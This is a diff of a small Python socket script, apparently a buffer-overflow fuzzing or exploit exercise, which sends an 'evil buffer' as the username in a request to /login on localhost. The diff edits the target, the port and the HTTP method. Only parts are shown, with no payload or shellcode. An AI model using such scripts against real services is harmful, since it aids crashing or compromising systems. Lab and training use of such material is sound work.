@@ -1,8 +1,9 @@
 #!/usr/bin/python
 import socket
 
-IP = input("IP\n")
-PORT = input("PORT\n")
+IP = "127.0.0.1"
+PORT = 80
+
 
 try:
     print("\nSending evil buffer ")
@@ -12,7 +13,7 @@ try:
 
     content = "username=" + inputBuffer + "&password=A"
 
-    buffer = "POST /login HTTP/1.1\r\n"
+    buffer = "GET /login HTTP/1.1\r\n"
     buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
     buffer += "\r\n"
 
@@ -20,7 +21,7 @@ try:
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    s.connect((IP, PORT))
+    s.connect((IP, int(PORT)))
 
     s.send(buffer.encode('ascii'))
 
